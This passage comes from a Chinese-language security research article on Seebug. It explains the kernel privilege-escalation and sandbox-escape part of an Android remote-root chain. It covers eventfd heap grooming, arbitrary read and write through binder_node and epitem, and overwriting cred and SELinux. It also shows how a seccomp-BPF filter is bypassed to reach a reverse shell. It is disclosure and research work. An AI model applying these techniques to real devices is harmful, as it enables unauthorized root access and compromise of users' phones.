![](https://images.seebug.org/content/images/2021/08/5699bfde-3e33-470d-a67f-461c617b6787.png-w331s)

在调用系统调用来创建seq_file结构体时，从其业务逻辑实现上来看，会先分配一个op结构体，这两个结构体成对出现，在内存布局效果上来看如上所示。我们的基本思路是通过进一步的堆布局逐步将其分隔开，但找出这么一个合适的结构体并不容易。在深入探索之后，我们找到了一个eventfd相关的结构体。

该结构具备的特点可以完美的适用于于这一场景：

  * 创建eventfd的系统调用可以在sandbox中访问
  * 与eventfd相关联的结构体大小刚好为128
  * 当关闭eventfd时对应的结构体也会同时被释放
  * 按照特定的顺序创建和释放结构体便可以构造出的如上的布局

### Prepare holes with eventfd

这样我们便可以先创建大量的eventfd来实现内存布局，假设其布局效果如下图。紧接着，关闭eventfd3，然后关闭eventfd1，其效果如图中下半部分。

![](https://images.seebug.org/content/images/2021/08/7f5d4623-caab-469f-b575-c19db1d9d412.png-w331s)

之后打开/proc/self/comm，创建的op及seq_file将分配在已经预先隔开的slab上。再关闭eventfd2便可以在seq_file前留下一个闲置的slab对象。

![](https://images.seebug.org/content/images/2021/08/32aefe1e-96cb-42a9-83b2-d35620932e3f.png-w331s)

### Build arbitrary read and write

这个问题得到解决后，我们便可以基于该模型来构建任意地址读写方案。

![](https://images.seebug.org/content/images/2021/08/d1008a39-2483-4e02-ae82-134d36da3938.png-w331s)

具体步骤如下：

  * 堆喷大量的binder_node来填充这些空置slab对象
  * 触发漏洞，使其释放kfree(C+8)
  * 堆喷epitem来占用C+8位置

### Leak kernel address

在async_todo双向链表在初始化时候prev&next指针会被初始化为自身地址。该binder_node结构体的prev指针地址会被残留在seq_file的头部，也即buf指针的位置，这意味着我们找到了一个信息泄露的起始点。
![](https://images.seebug.org/content/images/2021/08/3f2a8ac4-63c9-4338-b382-7d51a9f44f4f.png-w331s)

    
    
    pwndbg> pt/o struct binder_node
    /* offset | size */ type = struct binder_node {
    /* 0 | 4 */ int debug_id;
    /* 4 | 4 */ spinlock_t lock;
    ... skip ...
    /* 112 | 16 */ struct list_head {
    /* 112 | 8 */ struct list_head *next;
    /* 120 | 8 */ struct list_head *prev;
    /* total size (bytes): 16 */
    } async_todo;    <---------------- async_todo双向链表
    /* total size (bytes): 128 */
    }

因为我们在堆上布局了大量的binder_node，所以我们第一步可以泄露出binder_node的内容，从中我们可以直接泄露出binder_proc的地址。接下来步骤就是用epitem把该binder_node替换掉，构建任意读原语。然后利用该原语，可以依次找到当前线程的task_struct，然后是其所属的task_group。有了task_group，就可以通过tid找到指定线程的task。沿着这个思路，我们可以获得需要的所有信息。自此之后，后续的提权成功只是流程和步骤多少的问题。

### Last step to get root ?

在拥有了这种任意地址读写元语后，整个提权流程将变得非常简单，比较直接有效的办法还是攻击自主访问控制和强制访问控制。有了这个信息泄露的起点后，我们可以逐步拿到thread_info地址，将其修改为ROOT用户，修改cred，再关掉selinux_enforcing。这样是不是就可以成功提权了呢？上面提到沙箱进程中还有BPF机制的保护，还需要去关闭其BPF保护。

![](https://images.seebug.org/content/images/2021/08/cc556f1b-f58c-4a21-abe0-620162e49c7c.png-w331s)

### Last step to get root !

Chrome的BPF过滤器过滤掉了大多数的系统调用，需要关掉BPF才能建立socket通信，实现反弹shell

  * thread->seccomp->filter指向了所用的BPF规则，但该指针不能被直接置为空，相应的检测机制会触发kernel panic
  * BPF过滤规则通过链表组织，在我们的测试中，其一共有四项，我们将其设置为倒数第二项可以绕过系统调用限制，并能成功创建socket，实现反弹shell！

## Demo

下面链接使我们录制的一个攻击演示视频，该视频示范了利用该利用链可以在Pixel 4上安装任意应用。

链接：<https://www.bilibili.com/video/BV1qg411L76y>

## **Conclusion**

本文介绍了该条远程ROOT利用链沙箱逃逸提权部分，具体介绍了我们在尝试利用该漏洞在高度沙箱化的进程中攻击内核时遇到的各类问题，以及解决方法。文中所的一次触发漏洞就实现稳定任意地址读写方案非常强大，但该案对结构体大小的依赖比较大，其中用到的seq_file及binder_node结构体其大小在不同的系统版本上可能会有所变化，这些变化可能会导致利用方案的失败，但基于该模型有可能找到一些其他的替代方案。目前该利用方案还是需要适配selinux_enforcing符号地址，这也留下了一个问题，这一步在拥有了稳定内核地址读写元语后能不能自动化完成?

安卓系统在内外多重推力下其安全性得到了不断的加强，各类防护机制被不断引入，谷歌多次提高其漏洞奖励计划奖励额度，体现其对自身产品安全性的信心。但绝对安全只是我们的愿景，现实却非常残酷。文中介绍的漏洞利用方案，在极为苛刻的条件下，采用极为简单的方案实现了仅触发一次漏洞就获得了稳定的任意地址读写元语，使得系统现有的各类防护变得脆弱不堪，其中一次触发漏洞也达到了理论极限。防护更多的是考虑的是一个面，而攻击却可以仅找一个点，攻防对抗也将在这个过程不断博弈，不断发展。

最后，在这里感谢团队小伙伴龚广、姚俊、张弛在这条利用链中所提供的帮助。他们提出了许多宝贵的建议，给了我们诸多启发，感谢他们！

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1685/>

